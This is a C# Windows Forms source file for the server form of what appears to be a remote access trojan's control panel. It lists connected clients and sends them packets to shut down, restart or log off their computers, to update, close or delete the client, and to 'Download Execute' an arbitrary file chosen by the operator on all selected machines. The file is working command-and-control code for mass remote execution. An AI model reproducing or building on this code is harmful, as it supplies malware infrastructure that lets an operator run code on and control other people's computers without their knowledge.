using Packets.Commands;
using Server.Networking;
using Server.Settings;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace Server.Forms
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            Config.Initialize();
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            new Networking.Server(Config.Port);
        }

        #region Form Helper
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();
            clientsListView.Invoke((MethodInvoker)delegate
            {
                lock (Config.LockListViewClients)
                {
                    foreach (ListViewItem item in clientsListView.SelectedItems)
                    {
                        clients.Add((Client)item.Tag);
                    }
                }
            });
            return clients.ToArray();
        }

        private Client[] GetAllClients()
        {
            List<Client> clients = new List<Client>();
            clientsListView.Invoke((MethodInvoker)delegate
            {
                lock (Config.LockListViewClients)
                {
                    foreach (ListViewItem item in clientsListView.Items)
                    {
                        clients.Add((Client)item.Tag);
                    }
                }
            });
            return clients.ToArray();
        }
        #endregion


        #region Computer Option
        private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketComputerShutdown computerShutdown = new PacketComputerShutdown();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, computerShutdown);
            }
        }

        private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketComputerRestart computerRestart = new PacketComputerRestart();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, computerRestart);
            }
        }

        private void LogoffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketComputerLogoff computerLogoff = new PacketComputerLogoff();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, computerLogoff);
            }
        }
        #endregion


        #region Client Option
        private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (clientsListView.SelectedItems.Count == 0) return;
                using (OpenFileDialog openFile = new OpenFileDialog())
                {
                    if (openFile.ShowDialog() == DialogResult.OK)
                    {
                        PacketClientUpdate clientUpdate = new PacketClientUpdate
                        {
                            fileBytes = File.ReadAllBytes(openFile.FileName)
                        };
                        foreach (Client client in GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(client.Send, clientUpdate);
                        }
                    }
                    else
                    {
                        return;
                    }
                }
            }
            catch
            {
                return;
            }
            finally
            {
                GC.Collect();
            }
        }

        private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketClientClose clientClose = new PacketClientClose();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, clientClose);
            }
        }

        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketClientRestart clientRestart = new PacketClientRestart();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, clientRestart);
            }
        }

        private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientsListView.SelectedItems.Count == 0) return;
            PacketClientDelete clientDelete = new PacketClientDelete();
            foreach (Client client in GetSelectedClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, clientDelete);
            }
        }
        #endregion


        #region Download Execute
        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (clientsListView.SelectedItems.Count == 0) return;
                using (OpenFileDialog openFile = new OpenFileDialog())
                {
                    if (openFile.ShowDialog() == DialogResult.OK)
                    {
                        PacketDownloadExecute downloadExecute = new PacketDownloadExecute
                        {
                            fileBytes = File.ReadAllBytes(openFile.FileName),
                            fileExtension = Path.GetExtension(openFile.FileName)
                        };
                        foreach (Client client in GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(client.Send, downloadExecute);
                        }
                    }
                    else
                    {
                        return;
                    }
                }
            }
            catch
            {
                return;
            }
            finally
            {
                GC.Collect();
            }
        }

        #endregion


        #region Timers
        private void TimerCounter_Tick(object sender, EventArgs e)
        {
            lock (Config.LockListViewClients)
            {
                this.toolStripStatusLabel1.Text = $"Online: {clientsListView.Items.Count.ToString()}    Selected: {clientsListView.SelectedItems.Count.ToString()}";
            }
        }

        private void TimerPing_Tick(object sender, EventArgs e)
        {
            foreach (Client client in GetAllClients())
            {
                ThreadPool.QueueUserWorkItem(client.Send, new PacketPing());
            }
            Debug.WriteLine("Server Ping");
        }
        #endregion

    }
}